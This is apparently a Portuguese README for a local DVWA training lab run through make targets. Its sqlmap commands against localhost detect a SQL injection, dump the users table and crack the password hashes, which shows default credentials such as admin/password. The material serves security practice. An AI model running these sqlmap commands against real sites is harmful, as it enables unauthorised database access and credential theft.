# 0. Limpar o que ficou de antes
```bash
make clean
```
> Isso roda down (remove o container) + apaga o .dvwa-cookie e a pasta de output do sqlmap. Começa do zero de verdade.

# 1. Subir o DVWA
```bash
  make up
```

> Sobe o container e fica esperando até o DVWA responder. Termina com DVWA no ar em http://localhost:80.

#  2. Configurar (banco + login + cookie)
```bash
  make setup
```

> Roda o scripts/setup-dvwa.sh: cria o banco, loga admin/password, põe segurança em low e grava o .dvwa-cookie. É aqui que o cookie nasce. Termina com [+] OK. Cookie salvo....

# 3. Detectar a injeção + listar bancos
```bash
make scan
```
```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low PHPSESSID=$(COOKIE)" --batch --dbs --flush-session
```

> Roda sqlmap --dbs --flush-session. Detecta a injeção, identifica MySQL e lista dvwa, information_schema...

# 4. Extrair os dados
```bash
  make dump
```
```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low PHPSESSID=$(COOKIE)" --batch -D dvwa -T users --dump
```

> Extrai a tabela dvwa.users (usuários + hashes MD5).

Se quiser já quebrar as senhas:

```bash
  make crack
```
```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low PHPSESSID=$(COOKIE)"  --batch --answers="crack=Y" -D dvwa -T users --dump
```

> Mesmo dump, mas com --crack → mostra admin/password, gordonb/abc123, etc.

# 5. Level
```bash
  make level LEVEL=low
  make level LEVEL=medium
  make level LEVEL=high
  make level LEVEL=impossible
```


# 6. Encerrar
```bash
  make down
```